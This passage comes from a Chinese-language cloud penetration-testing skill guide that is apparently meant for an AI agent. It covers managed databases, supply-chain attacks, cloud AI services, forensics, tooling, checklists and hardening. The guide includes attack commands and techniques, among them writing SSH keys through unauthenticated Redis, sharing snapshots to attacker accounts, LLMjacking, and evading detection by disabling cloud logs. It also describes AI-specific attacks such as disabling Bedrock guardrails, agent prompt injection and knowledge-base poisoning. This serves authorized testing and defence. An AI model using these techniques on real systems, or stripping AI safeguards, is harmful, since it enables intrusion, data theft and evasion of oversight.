| GCP | Cloud SQL | 公网IP+无SSL强制+弱口令、Cloud SQL Auth Proxy未启用 |
| GCP | BigQuery | 数据集/表IAM过宽（allUsers可查询） |
| 阿里云 | RDS | 白名单0.0.0.0/0、弱口令、内外网地址混淆（私网地址被当作公网开放） |
| 通用 | 托管Redis/Memcached | 公网+无认证 → 写SSH key/反弹Shell |

```bash
# 探测公开托管数据库（Shodan/FOFA语法）
# AWS RDS: port:"3306" ssl:"Amazon RDS" / "rds.amazonaws.com"
# Azure: "database.windows.net"
# 阿里云RDS: port:"3306" "aliyuncs.com"
mysql -h <rds-endpoint> -u admin -p
# 无认证Redis写SSH key链
redis-cli -h <host> -p 6379
# config set dir /root/.ssh → set authorized_keys
```

### 8.2 数据库凭据链与快照攻击

```
1. 数据库连接串泄露（代码/配置/环境变量/heapdump）→ 直连托管数据库
2. 快照共享/导出：RDS/EBS/Cloud SQL 快照共享给攻击者账号 → 离线恢复读取全库
3. 跨账号RDS快照共享：modify-db-snapshot-attribute 添加攻击者账号ID
4. 数据库恢复后从系统表中提取其他凭据（mysql.user、pg_shadow等）继续横向
5. 备份文件公开：S3/OSS桶中的.sql/.bak备份未加密且桶公开
6. 托管数据库自带"导入导出"通道：Data Pipeline、DMS复制任务→指向攻击者库
7. 内存数据库（ElastiCache/Redis）无认证 + 弱口令 → 数据窃取/RCE
```

### 8.3 其他云服务独特漏洞与滥用

```
1. CloudFormation/Cloud Development Kit（IaC）：模板中硬编码密钥；ChangeSet/Stack策略
   → 结合 PassRole 执行任意IAM操作（UNC6426 提权环节）
2. SSM（Systems Manager）：
   - Parameter Store 明文参数（/prod/db_password 明文）
   - RunCommand 对托管实例执行命令（若持有ssm:SendCommand）
   - SSM Agent 端口的本地利用（未认证HTTP 127.0.0.1:9999+）
3. Service Quota / GetServiceQuota：侦察时摸清配额上限，规划挖矿/资源滥用规模（10分钟挖矿案例）
4. 备份服务滥用：云备份/Veeam等（2025年威胁报告显示备份系统成为首要目标）→ 删库/勒索先删备份
5. 事件桥/编排滥用：EventBridge、Step Functions 编排中的越权
6. 云密钥管理：KMS 密钥策略过宽（其他账号可加密/解密）、CMK自动轮换缺失
7. 静态网站/CDN：CloudFront/OSS静态托管 + 桶策略过宽 → 钓鱼基础设施
8. 消息队列：SQS/SNS/MNS 未授权订阅/消费 → 数据流窃听
```

## 九、多云、混合云与云供应链攻击

### 9.1 多云与身份联邦攻击

```
1. 身份联邦信任链（SAML/OIDC/SCIM）：
   - 企业IdP（Okta/Entra/钉钉/企业微信）→ 云SSO：IdP被攻破=所有云被接管
   - 云SSO信任策略过宽：允许任意组/角色映射
2. 跨云信任：AWS Organizations ↔ GCP/Azure 的联合身份配置错误
3. 多账号/多租户蔓延：Org/管理组/subscription 管理入口未加固（单点接管）
4. 云间复制/迁移管道：数据迁移任务中凭据与访问控制被忽略
5. SaaS层信任：Salesforce/Slack/Workday集成OAuth token（UNC6395：700+租户数据被窃）
```

### 9.2 混合云攻击面

```
1. VPN/专线（Express Connect/专线/VPN网关）：配置错误/弱认证/未打补丁的VPN设备 → 云内网入口
2. IDC↔云：云上VPC对IDC网段的信任（安全组放行全部IDC IP）→ IDC失陷=云内网失陷
3. 混合云DNS：云内DNS解析到IDC内网地址 → DNS重绑定绕过
4. AD域同步：云上AD连接器/密码哈希同步（AD Connect）→ 云上身份=域身份
5. 云备份↔本地：备份链路弱加密/弱认证
```

### 9.3 云供应链攻击（第三方云服务/镜像/依赖）

**攻击链与案例：**
```
1. 依赖投毒 → CI/CD执行 → 云凭据窃取 → 云接管：
   - s1ngularity（nx npm投毒，2025.08）：postinstall窃取环境变量/AI工具凭据（QUIETVAULT）
     → UNC6426 借GitHub→AWS OIDC信任72小时拿下AWS管理员
   - tj-actions/changed-files（CVE-2025-30066）、reviewdog/action-setup（CVE-2025-30154）：
     第三方GitHub Actions投毒影响23,000+仓库
   - TanStack事件（CVE-2026-45321）：pull_request_target链式利用，首个带有效SLSA L3
     证明的恶意npm包（自传播蠕虫，170+包受影响）
2. 镜像投毒：恶意基础镜像/Docker Hub抢注/镜像拉取劫持 → 生产集群执行
3. 依赖混淆：私服缺失时，同名公共包（dependency confusion）→ 供应链RCE
4. 第三方云服务供应商：使用SaaS/外包云管理服务 → 供应商失陷=客户云失陷（连坐）
```

**供应链审计命令：**
```bash
# GitHub Actions 供应链审计
# 1. 检查工作流中第三方Actions是否固定commit SHA
grep -r "uses:" .github/workflows/ | grep -v "@"  # 未固定版本=风险
# 2. 检查 pull_request_target 使用（危险footgun）
grep -r "pull_request_target" .github/workflows/
# 3. 检查 OIDC 信任策略（AWS侧）
aws iam list-roles --query 'Roles[].AssumeRolePolicyDocument' --output json | grep -i oidc
# 4. 检查工作流权限最小化
grep -r "permissions:" .github/workflows/

# 镜像供应链扫描
trivy image --severity HIGH,CRITICAL <image>
cosign verify --key <pubkey> <image>   # 签名验证
docker sbom <image>                     # SBOM清单
```

## 十、云上 AI 服务攻击面

### 10.1 托管LLM平台（AWS Bedrock / Azure OpenAI / Vertex AI / 阿里云百炼）

**AWS Bedrock 已验证的 8 条 IAM 攻击向量（XM Cyber 2026.03）：**
```
1. 模型调用日志重定向：bedrock:PutModelInvocationLoggingConfiguration + s3:DeleteObject
   → 把全量提示词/响应日志改导向攻击者桶 + 销毁原有取证证据
2. Knowledge Base 凭据窃取：bedrock:GetKnowledgeBase 返回的集成凭据
   （连接Pinecone/Redis/Aurora/Redshift的凭据）→ 直接接管向量库
3. 知识库数据源投毒：篡改 SharePoint/Salesforce/Confluence/S3 数据源 → 污染RAG答案
4. Agent 直接注入：给Bedrock Agent输入含恶意指令的prompt → Agent调用外部API/读S3
5. Agent 间接注入：知识库中的恶意文档污染Agent决策（连供应链）
6. Flow 劫持：bedrock:UpdateFlow → 篡改自动化流程逻辑
7. Guardrail 禁用：bedrock:DeleteGuardrail / UpdateGuardrail → 移除内容过滤与合规控制
8. 模型访问滥用（LLMjacking）：用盗用凭据调用基础模型，单日成本最高$46,000
```

**LLMjacking 检测与利用：**
```bash
# 盗用凭据后枚举可用的模型与区域
aws bedrock list-foundation-models --region us-east-1 --by-provider anthropic
aws bedrock invoke-model --model-id anthropic.claude-3-5-sonnet-20241022-v2:0 \
  --body '{"prompt":"Hello","max_tokens":10}' --cli-binary-format raw-in-base64-out out.json
# 特征：模型调用日志默认关闭 → 取证盲区，攻击者常先做这步再行动
```

**其他托管LLM风险：**
- **模型提取**：通过API黑盒查询复制精调模型功能（影子模型）
- **训练数据提取**：诱导模型吐露训练语料中的敏感数据
- **Azure OpenAI / Vertex AI**：API key泄露、部署未设配额（成本炸弹）、内容过滤配置缺失
- **AI Agent（2025年攻击热点）**：Memory poisoning（长期记忆投毒，跨会话持久）、间接Prompt注入
  （ForcedLeak CVE：Salesforce Agentforce间接注入泄露CRM数据，CVSS 9.4）

### 10.2 向量数据库攻击

```
1. 未授权访问（最高频）：向量库默认无认证/弱认证
   - Milvus CVE-2025-64513（CVSS 9.3）：单HTTP头固定常量绕过全部认证，存在公开PoC扫描器
   - Chroma：2025年调查发现1,170+个公网可达实例，约1/3暴露生产数据无认证（Pwn2Own Berlin
     2025 AI类目靶标之一）
   - Qdrant 官方文档自认默认不安全；Weaviate v1.29.0才加入RBAC；Pinecone namespace不是安全边界
2. Embedding反转（Vec2Text）：92%的32-token文本可从embedding精确重建 → 向量泄露=原始数据泄露
3. 知识库投毒（PoisonedRAG，USENIX Security 2025）：注入5个恶意文档到百万文档库，
   攻击成功率90-99% → 污染RAG答案/窃取信息/诱导转账
4. 语义欺骗：构造语义相近的恶意向量劫持检索结果
5. 云上向量库（Pinecone/Qdrant Cloud/Azure AI Search）API key泄露 → 读库/删库/改写
```

```bash
# 向量库未授权探测
curl http://<host>:8000/api/v1/collections   # Chroma
curl http://<host>:19530/v2/vectordb/collections/list  # Milvus
# OWASP LLM Top10 (2025版) LLM08: Vector and Embedding Weaknesses 已官方收录
```

### 10.3 AI 基础设施与模型供应链

```
1. GPU容器工具链逃逸：NVIDIA Container Toolkit（CVE-2025-23266 NVIDIAScape CVSS 9.0，
   37%云环境受影响；三行Dockerfile：LD_PRELOAD注入）→ 逃逸后窃取模型权重
2. 模型文件投毒（存储层）：MinIO CVE-2025-31489 任意覆盖写 → 替换.pt/.safetensors →
   加载即RCE（字节跳动实习生投毒事件同源风险）
3. 模型注册表/仓库（HuggingFace私有部署/云托管）：弱认证、恶意模型上传、pickle反序列化
4. 暴露的AI工具服务：10,000+ 未认证Ollama、2,000+ Redis、200+ ChromaDB（Trend Micro 2025）
5. AI Agent沙箱逃逸：Bedrock AgentCore Code Interpreter沙箱逃逸（2025.09），
   "无网络"配置下仍可DNS外带数据；CVE-2026-4269 AgentCore恶意S3构建产物RCE
```

## 十一、AI 大模型结合：AI 辅助云攻防

### 11.1 AI 辅助云配置审计（防御/审计视角）

**用 LLM 分析 IAM 策略与云资源导出找问题：**
```bash
# 1. 导出云资源清单
# AWS：使用 prowler / cloudsploit 导出，或用 config 快照
prowler aws -M json > audit.json
# 2. 导出IAM策略
aws iam list-policies --scope Local --output json > policies.json
aws iam get-account-authorization-details --output json > authz.json
# 3. 交给LLM分析（提示词框架）：
#    - "从policies.json中找出所有允许'*'动作或'*'资源的策略，标注被谁引用"
#    - "分析authz.json中的信任策略，找出Principal为'*'或OIDC sub未限定的角色"
#    - "找出包含iam:PassRole/CreatePolicyVersion/AttachUserPolicy等提权动作的权限边界"
#    - "对照审计清单逐项输出风险等级与修复建议"
```
**LLM 审计价值点：**
- IAM 策略批量语义分析（人读千条JSON不可行，LLM可规模化找提权路径组合）
- 信任策略/条件表达式语义误判识别（StringEqualsIfExists 类）
- 云资源导出（配置快照）→ 识别公网暴露、加密缺失、版本控制关闭等基线问题
- 输出结构化风险报告 + 修复代码（Terraform/IAM Policy修正）

### 11.2 AI 驱动云攻击路径规划（攻击视角）

**AI 压缩"发现→决策→执行"链路（8分钟攻击案例证明有效性）：**
```
1. 凭据/枚举结果输入LLM → 自动生成权限提升路径排序（先试哪条提权链）
2. 根据 IAM 权限矩阵生成利用代码（如基于Lambda角色的提权函数）
3. 攻击操作自动化：批量AssumeRole尝试、策略注入payload生成
4. 数据外传方案优化：选择最隐蔽的通道（S3复制/云存储中继）
5. 对抗调整：根据报错信息自动改写命令（LLM驱动的交互式入侵）
```

**AI 辅助攻击特征（检测侧识别线索）：**
```
- 代码含LLM典型异常处理模式（except: pass包裹全部）
- 幻觉的GitHub URL/AWS账号ID（不存在但格式正确）
- session name 含 "claude-session"/"gpt" 等字样
- 命令执行速度远超人工节奏（分钟级批量操作）
```

### 11.3 大模型云服务攻击面（LLM 自身作为入口）

```
1. 面向LLM的云API（Bedrock/OpenAI/Vertex）key泄露 → LLMjacking/数据读取
2. LLM应用后端：RAG管道（向量库/存储）→ 前文第十章全链
3. AI编码工具链（Claude Code/Gemini CLI/Amazon Q）本地凭据文件 → 供应链窃取目标
4. AI Agent 权限过大：给Agent的云工具权限=给攻击者的权限（Agent间接注入接管）
5. 提示注入桥接云API：诱导Agent执行 sts:assume-role / S3读取等真实云操作
```

## 十二、云取证与对抗

### 12.1 云日志体系（审计与取证基线）

| 平台 | 审计日志 | 数据事件 | 网络流 |
|------|---------|---------|--------|
| AWS | CloudTrail（管理事件/数据事件） | S3 Access Logs | VPC Flow Logs |
| Azure | Activity Log | Diagnostic Logs | NSG Flow Logs |
| GCP | Cloud Audit Logs（Admin/Data Access） | Storage Logs | VPC Flow Logs |
| 阿里云 | ActionTrail | OSS访问日志 | VPC流日志 |

```bash
# 取证视角：快速定位异常
# CloudTrail 中找提权动作
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy --max-results 50
# 找 AssumeRole 横跳
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --max-results 100
# 找新凭据创建
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey
# 找日志自身被操作（攻击信号！）
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging
```

### 12.2 检测规避（攻击者视角对抗）

```
1. 日志禁用/删除（T1562.008 Disable or Modify Cloud Logs——ATT&CK云矩阵最高保真检测点）：
   - AWS: StopLogging / DeleteTrail / UpdateTrail / PutBucketLifecycle(短过期自动删日志桶)
   - Azure: Diagnostic settings 删除 / Activity Log retention缩短
   - GCP: Cloud Audit Logs sink 删除 / exclusion filter
   - 阿里云: ActionTrail 停用 / 日志库删除
2. 时间线破坏：修改资源创建时间戳、快照删除
3. LOTC（Living-off-the-cloud）：纯API操作 + 合法云服务中继（S3/云盘/Slack API）做C2与数据外带
4. 身份拟态：伪造可信role-session-name（如CI/CD管道名）、借用服务角色执行
5. 隐蔽凭据：创建拟态命名的AK（backup-svc-2026）替代轮换
6. 小批量慢速外传：规避批量下载检测规则与数据量告警阈值
7. 跨区域操作：在日志未启用的区域执行关键操作
```

### 12.3 云取证要点（对抗中的证据保全）

```
1. 先保全再响应：CloudTrail/S3日志桶开启版本控制+对象锁定（Object Lock/WORM）
2. 快照优先：EC2/RDS/EBS 先打快照再隔离，防止攻击者删数据
3. 日志外置：CloudTrail日志多副本到不可变存储（S3 Object Lock / 第三方SIEM）
4. 时间线构建：以 GetCallerIdentity → 首次异常操作 → 提权 → 外传 建立时间线
5. 注意 CloudTrail Lake 已于2026.05.31停止新客户开通——取证方案需迁移
6. 身份侧取证：SSO登录日志、MFA事件、令牌使用地（IP/UA）
7. 对抗前提：攻击者大概率已删部分日志——以"日志缺失本身"作为攻击证据
```

### 12.4 红队对抗作战要点
```
1. 行动前记录目标日志配置（哪家审计开没开、保留多久）→ 决定规避策略
2. 首选管理账号/根凭据的获取路径往往能顺带获得日志权限
3. 使用独立IP/代理池 + 合理时区操作，模拟正常业务行为
4. 明确"触警预期"：已知检测规则的动作（StopLogging等）留到收尾或改用替代手法
5. 每步操作同步记录CloudTrail事件名，便于报告阶段给客户做检测验证
```

## 十三、工具链

```bash
# ── 云安全审计/合规 ──
prowler                     # AWS/Azure/GCP/阿里云(community) 安全审计，CIS基准
ScoutSuite                  # 多云安全审计（AWS/Azure/GCP/阿里云）
CloudSploit                 # AWS配置审计
Steampipe + Powerpipe       # 用SQL做多云资产与合规查询（适合LLM结合审计）
kubeaudit / kube-bench      # K8s集群/基线审计

# ── 身份枚举与攻击 ──
pacu                        # AWS攻击框架（iam__bruteforce_permissions等模块）
enumerate-iam               # AWS权限盲测枚举
aws-consoler                # AK/SK转Console登录
BloodHound + AzureHound     # Azure/Entra ID 提权路径图
Stormspotter                # Azure资源关系图谱
GCPwn                       # GCP攻击工具集
gcp-iam-collector           # GCP IAM分析
aliyun_ram_checker          # 阿里云RAM审计（社区工具）

# ── 枚举/测绘 ──
CloudBrute                  # 云资产枚举
cloud_enum                  # 多云资源枚举
cartography                  # 资产图谱（Neo4j）
Shodan/FOFA/Quake           # 公网暴露面
cloudlist                   # 多云资产清单
OSS_Scanner                 # 多厂商OSS存储桶扫描（阿里云/腾讯云/华为云/AWS）

# ── 容器/K8s ──
kube-hunter                 # K8s渗透测试
peirates                    # K8s渗透工具集
kdigger                     # 容器环境探测（逃逸前置侦察）
deepce                      # 容器逃逸辅助
trivy                       # 镜像/仓库/K8s漏洞扫描
cdk (Container Dunk Kit)    # 容器逃逸工具箱
falconhound / falco         # 运行时检测（防御侧）

# ── 元数据/SSRF ──
trufflehog / gitleaks       # 凭据扫描
Cloud Metadata Toolkit      # 元数据服务探测
ssrfmap                     # SSRF自动化利用

# ── AI安全 ──
garak                       # LLM漏洞扫描（提示注入/越狱）
promptmap                   # LLM红队
pyrit / llm-guard           # AI安全测试框架
vectordb审计：Chroma/Milvus/Pinecone 官方CLI + 未授权探测脚本
# 模拟工具：imagetragick、恶意模型检测（picklescan）

# ── 取证/检测（防御视角） ──
CloudTrail Insights         # AWS异常行为检测
GuardDuty / Sentinel / Chronicle / 阿里云态势感知
Sigma规则库（云检测）        # ATT&CK映射检测规则
```

## 十四、测试检查清单

### 14.1 侦察与资产枚举
- [ ] 完成子域名/证书/DNS被动枚举，识别云厂商
- [ ] 使用Shodan/FOFA检索公网暴露云资源（存储桶/数据库/K8s API/SSH/RDP）
- [ ] GitHub/gitleaks 扫描AK/SK/Token泄露（含AI工具凭据文件）
- [ ] 检查CI/CD日志、容器镜像层、前端JS中的凭据泄露
- [ ] 测试云存储桶（S3/OSS/Blob/GCS）匿名读写与枚举

### 14.2 IAM 与身份
- [ ] 枚举当前身份权限（sts get-caller-identity / 盲测枚举）
- [ ] 审计 IAM/RAM 策略是否存在过度授权（*动作/*资源）
- [ ] 测试提权路径：CreatePolicyVersion / PutUserPolicy / AttachUserPolicy / AddUserToGroup
- [ ] 测试 iam:PassRole 与 lambda:CreateFunction / ec2:RunInstances 组合
- [ ] 审计角色信任策略：Principal通配、OIDC sub/aud未限定、StringEqualsIfExists误用
- [ ] 检查 Organizations 管理账号防护与 sts:AssumeRoot 风险
- [ ] Azure：Service Principal权限、条件访问策略、目录角色分配
- [ ] GCP：服务账号actAs/密钥创建权限、Workload Identity
- [ ] 阿里云：RAM子账号过度授权、AttachPolicyToUser、PassRole

### 14.3 存储与数据
- [ ] 审计存储桶策略/ACL/版本控制/CORS（匿名读写、ListBucket公开）
- [ ] 测试预签名URL/STS临时凭据权限是否过大
- [ ] 测试Dangling DNS/Bucket接管
- [ ] 检查备份/快照是否公开共享（RDS/EBS/Cloud SQL快照）
- [ ] 检查数据库公网暴露与弱口令（RDS/Redis/Mongo/ES）

### 14.4 元数据与SSRF
- [ ] 测试SSRF访问各平台元数据端点（含Header要求）
- [ ] 检查IMDSv2是否启用、Token防护是否可绕过（IPv6/容器网络）
- [ ] 从元数据获取临时凭据并验证权限范围

### 14.5 容器与K8s
- [ ] 审计K8s RBAC（cluster-admin、过度SA权限）
- [ ] 测试API Server未授权/弱认证
- [ ] 检查Pod特权/hostPath/hostPID/Docker Socket挂载
- [ ] 检查镜像漏洞与供应链（trivy扫描、签名验证）
- [ ] 测试云托管K8s节点角色/Workload Identity权限

### 14.6 Serverless/托管服务/AI
- [ ] 审计Lambda/FC函数角色与触发器的过度授权
- [ ] 检查函数环境变量中的敏感配置
- [ ] 测试事件源注入（S3/SQS/API Gateway触发）
- [ ] 审计托管LLM（Bedrock等）模型调用权限与日志配置
- [ ] 测试向量数据库未授权访问与知识库投毒
- [ ] 检查AI Agent权限边界与提示注入面

### 14.7 供应链与CI/CD
- [ ] 审计GitHub Actions工作流：第三方Action固定版本、pull_request_target、权限最小化
- [ ] 审计OIDC联邦信任策略（sub/aud限定）
- [ ] 检查容器镜像来源与签名（cosign/SBOM）
- [ ] 检查依赖混淆风险（私服配置）

### 14.8 取证与对抗
- [ ] 确认审计日志启用范围与保留期（CloudTrail/ActionTrail/Activity Log）
- [ ] 测试日志完整性保护（S3 Object Lock/不可变存储）
- [ ] 记录检测规则覆盖面（GuardDuty/告警规则）与响应时间
- [ ] 验证 StopLogging/DeleteTrail 等动作是否触发告警

## 十五、修复建议与加固

### 15.1 身份与访问（最高优先级）
- **最小权限**：IAM/RAM策略仅授必要权限；拒绝"*"动作+通配资源；定期用prowler/LLM策略审计
- **信任策略收紧**：Principal限定具体ARN；OIDC的sub/aud精确匹配仓库与分支；禁用StringEqualsIfExists滥用
- **PassRole治理**：使用 `iam:PassRole` 的 `iam:PassedToService` 与资源级条件约束；审计谁持有PassRole
- **强制MFA**：所有管理员/敏感操作强制MFA；警惕MFA旁路（会话cookie窃取、vishing）
- **短时凭据**：全面使用STS/角色替代长期AK；定期轮转并清理未用AK
- **管理账号加固**：Organizations管理账号独立、强管控；限制sts:AssumeRoot使用场景
- **OIDC护栏**：参考AWS 2025年6月默认护栏，存量易受攻击角色必须人工审计修复

### 15.2 数据与存储
- **存储桶私有化**：禁止匿名读写；开启版本控制+访问日志；CORS最小化
- **加密**：服务端加密（SSE-KMS）+传输加密；KMS密钥策略收紧
- **快照/备份**：禁止公开共享；删除保护开启；备份走不可变存储
- **数据库**：关闭PubliclyAccessible；白名单最小化；强制SSL；禁用默认弱口令

### 15.3 网络与计算
- **IMDSv2强制**：仅允许IMDSv2+Token；容器/无服务器环境隔离元数据访问
- **安全组/NACL**：最小开放；SSH/RDP仅限堡垒机；VPC端点私有化访问云服务
- **K8s**：启用Pod Security Admission/seccomp/AppArmor；限制hostPath/privileged；网络策略默认拒绝；镜像签名准入
- **容器运行时**：及时更新runc/containerd（2025年三漏洞）与NVIDIA Container Toolkit（NVIDIAScape）

### 15.4 云上AI
- **Bedrock等托管LLM**：启用模型调用日志；Guardrail强制；Knowledge Base连接凭据用密钥托管；限制bedrock:*写权限
- **向量库**：开启认证与RBAC；不暴露公网；API key最小权限与轮换
- **模型供应链**：镜像/模型文件哈希校验+签名；存储桶写权限最小化（防MinIO类投毒）
- **AI Agent**：权限最小化；输出/工具调用审计；防内存投毒与间接注入

### 15.5 供应链与CI/CD
- GitHub Actions：第三方Action固定commit SHA；禁pull_request_target处理fork代码；permissions最小化；OIDC临时凭据
- 依赖安全：锁文件+私服+依赖混淆防护；npm/pypi包签名验证
- 镜像：cosign签名+SBOM+准入控制器校验

### 15.6 日志与检测
- 全区域CloudTrail/ActionTrail/Activity Log启用，管理事件+数据事件全覆盖
- 日志桶不可变（Object Lock/WORM）+多副本外置；对 StopLogging/DeleteTrail 即时告警
- GuardDuty/态势感知+行为基线；覆盖ATT&CK v18云矩阵（K8s/CI/CD/云数据库）
- 备份与恢复演练；针对"删库+删备份"勒索流程设计隔离恢复环境（CIRE）

## 十六、注意事项与合规声明

- **仅限授权测试**：本技能所有技术仅适用于已获得**书面授权**的渗透测试、红队演练与安全审计项目。未经授权对云环境实施任何探测/利用行为均违反《网络安全法》《刑法》及目标平台服务条款，属违法行为
- **合规声明**：使用云厂商官方API、工具与CLI时，须遵守云平台可接受使用政策（AUP）与渗透测试条款（如AWS渗透测试政策允许的范围）；超出范围的资源（第三方租户、未授权账号）一律禁止触碰
- **最小影响原则**：优先使用无害探测（DNSLog/只读API/枚举），确认漏洞后再最小化验证；禁止破坏性操作（删数据、停服务、大规模资源创建）
- **成本警示**：云资源操作会产生费用（LLMjacking、挖矿、GPU实例、大流量外传），测试前确认计费边界与配额，防止成本爆炸
- **数据保护**：不读取/下载/留存敏感业务数据；涉密数据（PII、支付、健康信息）只做存在性验证
- **痕迹管理**：测试结束后清理所有创建的资源（Lambda/角色/用户/快照/桶）、凭据与工具；写入文件的场景须完整清除
- **环境隔离**：使用独立测试账号/订阅/项目，绝不在生产环境演练破坏性攻击
- **检测验证**：配合蓝队完成检测规则验证（触发已知告警并记录），是红队交付的一部分
- **情报时效**：云服务迭代快，本技能情报基线截至2026年中（ATT&CK v18、Bedrock 8向量、runc 2025三漏洞等），实战前需复核目标平台最新安全公告与CVE
- **报告义务**：及时向甲方提交含时间线、受影响资源、证据与修复建议的完整报告；高危问题同步口头预警

## DECISION TREE

```
云环境入口？
├── SSRF 可达元数据 → IMDSv1 直接读 → IMDSv2 先 PUT token（第四章）
├── 已有 AK/SK → 各云自鉴权枚举 → 权限边界图 → 提权路径（策略混淆/OIDC 信任滥用，第二章）
├── 对象存储面 → bucket 枚举/策略错误/子域接管（第三章）
├── K8s on cloud → 联动 container-security-testing
├── Serverless → 事件注入/环境变量泄露（第七章）
├── 托管数据库/中间件 → 第八章独特漏洞面
├── 云上 AI 服务密钥 → LLMjacking 检测（第十章）
└── 多云/混合 → 第九章跨信任边界路径
```

## TARGET TOOL ADAPTATION

Use visible `execute-python-script` for 签名请求构造与元数据探测、`http-framework-test` for 端点差分。不假设 aws/gcloud/aliyun CLI 已安装；凭据类验证只读不自改（不创建持久资源）。

## RELATED ROUTING

- [cloud-attack-methods](../cloud-attack-methods/SKILL.md) — 云上攻击总览与分流
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — 元数据 SSRF（IMDS/IMDSv2）是云凭证窃取的主入口
